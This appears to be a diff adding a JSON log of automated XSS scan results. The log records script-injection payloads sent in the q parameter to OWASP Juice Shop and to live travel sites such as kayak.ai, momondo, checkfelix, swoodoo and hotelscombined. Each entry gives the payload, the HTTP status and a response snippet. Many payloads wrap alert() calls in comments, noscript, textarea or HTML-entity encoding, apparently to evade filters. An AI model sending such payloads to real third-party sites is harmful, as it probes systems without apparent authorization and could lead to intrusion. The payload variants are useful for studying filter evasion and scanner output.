@@ -1,0 +1,562 @@
+[
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<body onload=<img src=x onerror=alert('xss')>>",
+    "status": 503,
+    "payload": "<body onload=<img src=x onerror=alert('xss')>>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html>\n  <head>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <meta charset=\"utf-8\">\n    <title>Application Error</title>\n    <style media=\"screen\">\n    "
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<!--<script>alert(1)</script>-->",
+    "status": 200,
+    "payload": "<!--<script>alert(1)</script>-->",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<!--<!--<script>alert(1)</script>-->-->",
+    "status": 200,
+    "payload": "<!--<!--<script>alert(1)</script>-->-->",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<!--URGENT:<!--<!--<script>alert(1)</script>-->-->-->",
+    "status": 200,
+    "payload": "<!--URGENT:<!--<!--<script>alert(1)</script>-->-->-->",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<form action='/submit'><input name='note' value='<script>alert(1)</script>'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<script>alert(1)</script>'></form>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<noscript><!--<!--<script>alert(1)</script>-->--></noscript>",
+    "status": 200,
+    "payload": "<noscript><!--<!--<script>alert(1)</script>-->--></noscript>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<body onload=<script>alert(1)</script>>",
+    "status": 200,
+    "payload": "<body onload=<script>alert(1)</script>>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<script>alert(1)</script>",
+    "status": 200,
+    "payload": "<script>alert(1)</script>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<script data-info='init'><!--<script>alert(1)</script>--></script>",
+    "status": 200,
+    "payload": "<script data-info='init'><!--<script>alert(1)</script>--></script>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<div style='display:none'><!--<script>alert(1)</script>--></div>",
+    "status": 200,
+    "payload": "<div style='display:none'><!--<script>alert(1)</script>--></div>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q={\"action\": \"sync\", \"data\": {\"token\": \"<img src=x onerror=alert('xss')>\"}}",
+    "status": 200,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"<img src=x onerror=alert('xss')>\"}}",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://juice-shop.herokuapp.com?q=<img src=x onerror=alert('xss')>",
+    "status": 200,
+    "payload": "<img src=x onerror=alert('xss')>",
+    "type": "XSS",
+    "snippet": "<!--\n  ~ Copyright (c) 2014-2025 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta c"
+  },
+  {
+    "url": "https://kayak.ai?q=<body onload=<script>alert(1)</script>>",
+    "status": 406,
+    "payload": "<body onload=<script>alert(1)</script>>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--URGENT:<!--<img src=x onerror=alert('xss')>-->-->",
+    "status": 406,
+    "payload": "<!--URGENT:<!--<img src=x onerror=alert('xss')>-->-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<body onload=<img src=x onerror=alert('xss')>>",
+    "status": 406,
+    "payload": "<body onload=<img src=x onerror=alert('xss')>>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q={\"action\": \"sync\", \"data\": {\"token\": \"<!--<body onload=<img src=x onerror=alert('xss')>>-->\"}}",
+    "status": 406,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"<!--<body onload=<img src=x onerror=alert('xss')>>-->\"}}",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<textarea><img src=x onerror=alert('xss')></textarea>",
+    "status": 406,
+    "payload": "<textarea><img src=x onerror=alert('xss')></textarea>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<script data-info='init'><body onload=<img src=x onerror=alert('xss')>></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><body onload=<img src=x onerror=alert('xss')>></script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--<img src=x onerror=alert('xss')>-->",
+    "status": 406,
+    "payload": "<!--<img src=x onerror=alert('xss')>-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--<img src=x onerror=alert('xss')>-->",
+    "status": 406,
+    "payload": "<!--<img src=x onerror=alert('xss')>-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<body onload=<img src=x onerror=alert('xss')>>",
+    "status": 406,
+    "payload": "<body onload=<img src=x onerror=alert('xss')>>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=&lt;img src=x onerror=alert('xss')&gt;",
+    "status": 406,
+    "payload": "&lt;img src=x onerror=alert('xss')&gt;",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q={\"action\": \"sync\", \"data\": {\"token\": \"<script>alert(1)</script>\"}}",
+    "status": 406,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"<script>alert(1)</script>\"}}",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--URGENT:setTimeout(()=><script>alert(1)</script>,1000)-->",
+    "status": 406,
+    "payload": "<!--URGENT:setTimeout(()=><script>alert(1)</script>,1000)-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<form action='/submit'><input name='note' value='&lt;img src=x onerror=alert('xss')&gt;'></form>",
+    "status": 406,
+    "payload": "<form action='/submit'><input name='note' value='&lt;img src=x onerror=alert('xss')&gt;'></form>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<div style='display:none'><body onload=<img src=x onerror=alert('xss')>></div>",
+    "status": 406,
+    "payload": "<div style='display:none'><body onload=<img src=x onerror=alert('xss')>></div>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<noscript>setTimeout(()=><script>alert(1)</script>,1000)</noscript>",
+    "status": 406,
+    "payload": "<noscript>setTimeout(()=><script>alert(1)</script>,1000)</noscript>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<body onload=<!--<img src=x onerror=alert('xss')>-->>",
+    "status": 406,
+    "payload": "<body onload=<!--<img src=x onerror=alert('xss')>-->>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<!--URGENT:&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;-->",
+    "status": 406,
+    "payload": "<!--URGENT:&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=setTimeout(()=><script>alert(1)</script>,1000)",
+    "status": 406,
+    "payload": "setTimeout(()=><script>alert(1)</script>,1000)",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q={\"action\": \"sync\", \"data\": {\"token\": \"<body onload=<img src=x onerror=alert('xss')>>\"}}",
+    "status": 406,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"<body onload=<img src=x onerror=alert('xss')>>\"}}",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<script data-info='init'><!--<img src=x onerror=alert('xss')>--></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><!--<img src=x onerror=alert('xss')>--></script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<noscript><body onload=<img src=x onerror=alert('xss')>></noscript>",
+    "status": 406,
+    "payload": "<noscript><body onload=<img src=x onerror=alert('xss')>></noscript>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<noscript>&lt;img src=x onerror=alert('xss')&gt;</noscript>",
+    "status": 406,
+    "payload": "<noscript>&lt;img src=x onerror=alert('xss')&gt;</noscript>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<script>alert(1)</script>",
+    "status": 406,
+    "payload": "<script>alert(1)</script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<div style='display:none'><img src=x onerror=alert('xss')></div>",
+    "status": 406,
+    "payload": "<div style='display:none'><img src=x onerror=alert('xss')></div>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<img src=x onerror=alert('xss')>",
+    "status": 406,
+    "payload": "<img src=x onerror=alert('xss')>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q={\"action\": \"sync\", \"data\": {\"token\": \"<img src=x onerror=alert('xss')>\"}}",
+    "status": 406,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"<img src=x onerror=alert('xss')>\"}}",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;",
+    "status": 406,
+    "payload": "&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<script data-info='init'><body onload=<img src=x onerror=alert('xss')>></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><body onload=<img src=x onerror=alert('xss')>></script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<noscript><script>alert(1)</script></noscript>",
+    "status": 406,
+    "payload": "<noscript><script>alert(1)</script></noscript>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://kayak.ai?q=<body onload=&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;>",
+    "status": 406,
+    "payload": "<body onload=&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<template><script>alert(1)</script></template>",
+    "status": 406,
+    "payload": "<template><script>alert(1)</script></template>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<!--<img src=x onerror=alert('xss')>-->",
+    "status": 406,
+    "payload": "<!--<img src=x onerror=alert('xss')>-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<body onload=<img src=x onerror=alert('xss')>>",
+    "status": 406,
+    "payload": "<body onload=<img src=x onerror=alert('xss')>>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<script data-info='init'><svg onload=<script>alert(1)</script>></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><svg onload=<script>alert(1)</script>></script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<noscript><svg onload=<script>alert(1)</script>></noscript>",
+    "status": 406,
+    "payload": "<noscript><svg onload=<script>alert(1)</script>></noscript>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<textarea><script>alert(1)</script></textarea>",
+    "status": 406,
+    "payload": "<textarea><script>alert(1)</script></textarea>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<!--URGENT:<img src=x onerror=alert('xss')>-->",
+    "status": 406,
+    "payload": "<!--URGENT:<img src=x onerror=alert('xss')>-->",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<script data-info='init'><script>alert(1)</script></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><script>alert(1)</script></script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<textarea><template><script>alert(1)</script></template></textarea>",
+    "status": 406,
+    "payload": "<textarea><template><script>alert(1)</script></template></textarea>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<textarea>&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;</textarea>",
+    "status": 406,
+    "payload": "<textarea>&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;</textarea>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<script>alert(1)</script>",
+    "status": 406,
+    "payload": "<script>alert(1)</script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<div style='display:none'><img src=x onerror=alert('xss')></div>",
+    "status": 406,
+    "payload": "<div style='display:none'><img src=x onerror=alert('xss')></div>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<img src=x onerror=alert('xss')>",
+    "status": 406,
+    "payload": "<img src=x onerror=alert('xss')>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<body onload=<body onload=<img src=x onerror=alert('xss')>>>",
+    "status": 406,
+    "payload": "<body onload=<body onload=<img src=x onerror=alert('xss')>>>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;",
+    "status": 406,
+    "payload": "&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<script data-info='init'><body onload=<img src=x onerror=alert('xss')>></script>",
+    "status": 406,
+    "payload": "<script data-info='init'><body onload=<img src=x onerror=alert('xss')>></script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<form action='/submit'><input name='note' value='<template><script>alert(1)</script></template>'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<template><script>alert(1)</script></template>'></form>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 06:44:10 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.momondo.com?q=<svg onload=<script>alert(1)</script>>",
+    "status": 406,
+    "payload": "<svg onload=<script>alert(1)</script>>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q={\"action\": \"sync\", \"data\": {\"token\": \"&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;\"}}",
+    "status": 406,
+    "payload": "{\"action\": \"sync\", \"data\": {\"token\": \"&lt;body onload=&lt;img src=x onerror=alert('xss')&gt;&gt;\"}}",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.momondo.com?q=<textarea><body onload=<img src=x onerror=alert('xss')>></textarea>",
+    "status": 406,
+    "payload": "<textarea><body onload=<img src=x onerror=alert('xss')>></textarea>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<body onload=<!--<script>alert(1)</script>-->>",
+    "status": 406,
+    "payload": "<body onload=<!--<script>alert(1)</script>-->>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<textarea><script>alert(1)</script></textarea>",
+    "status": 406,
+    "payload": "<textarea><script>alert(1)</script></textarea>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<!--URGENT:<!--<script>alert(1)</script>-->-->",
+    "status": 200,
+    "payload": "<!--URGENT:<!--<script>alert(1)</script>-->-->",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:04:03 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<!--<script>alert(1)</script>-->",
+    "status": 200,
+    "payload": "<!--<script>alert(1)</script>-->",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:05:03 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<!--URGENT:<script>alert(1)</script>-->",
+    "status": 200,
+    "payload": "<!--URGENT:<script>alert(1)</script>-->",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-at' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:07:37 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.checkfelix.com?q=<script>alert(1)</script>",
+    "status": 406,
+    "payload": "<script>alert(1)</script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<script data-info='init'>setTimeout(()=><!--<script>alert(1)</script>-->,1000)</script>",
+    "status": 406,
+    "payload": "<script data-info='init'>setTimeout(()=><!--<script>alert(1)</script>-->,1000)</script>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<!--<script>alert(1)</script>-->",
+    "status": 200,
+    "payload": "<!--<script>alert(1)</script>-->",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:39:03 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=setTimeout(()=><!--<script>alert(1)</script>-->,1000)",
+    "status": 200,
+    "payload": "setTimeout(()=><!--<script>alert(1)</script>-->,1000)",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:39:27 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<form action='/submit'><input name='note' value='<!--<script>alert(1)</script>-->'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<!--<script>alert(1)</script>-->'></form>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:48:19 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<div style='display:none'><!--<script>alert(1)</script>--></div>",
+    "status": 200,
+    "payload": "<div style='display:none'><!--<script>alert(1)</script>--></div>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:50:08 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.swoodoo.com?q=<div style='display:none'>setTimeout(()=><!--<script>alert(1)</script>-->,1000)</div>",
+    "status": 200,
+    "payload": "<div style='display:none'>setTimeout(()=><!--<script>alert(1)</script>-->,1000)</div>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='de-de' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 07:50:55 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;",
+    "status": 200,
+    "payload": "&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:11:45 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<!--<script>alert(1)</script>-->",
+    "status": 200,
+    "payload": "<!--<script>alert(1)</script>-->",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:13:16 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<textarea>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</textarea>",
+    "status": 200,
+    "payload": "<textarea>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</textarea>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:21:20 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<noscript><!--<script>alert(1)</script>--></noscript>",
+    "status": 406,
+    "payload": "<noscript><!--<script>alert(1)</script>--></noscript>",
+    "type": "XSS",
+    "snippet": ""
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<form action='/submit'><input name='note' value='<!--<script>alert(1)</script>-->'></form>",
+    "status": 200,
+    "payload": "<form action='/submit'><input name='note' value='<!--<script>alert(1)</script>-->'></form>",
+    "type": "XSS",
+    "snippet": "<!DOCTYPE html>\n<html lang='en-us' dir='ltr'>\n<head>\n<meta name=\"r9-version\" content=\"R768c\"/><meta name=\"r9-built\" content=\"20250521.060118\"/><meta name=\"r9-rendered\" content=\"Thu, 22 May 2025 08:24:11 GMT\"/><meta name=\"r9-build-number\" content=\"52\"/><link rel=\"stylesheet\" href=\"https://content.r9c"
+  },
+  {
+    "url": "https://www.hotelscombined.com?q=<script data-info='init'>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</script>",
+    "status": 406,
+    "payload": "<script data-info='init'>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</script>",
+    "type": "XSS",
+    "snippet": ""
+  }
+]
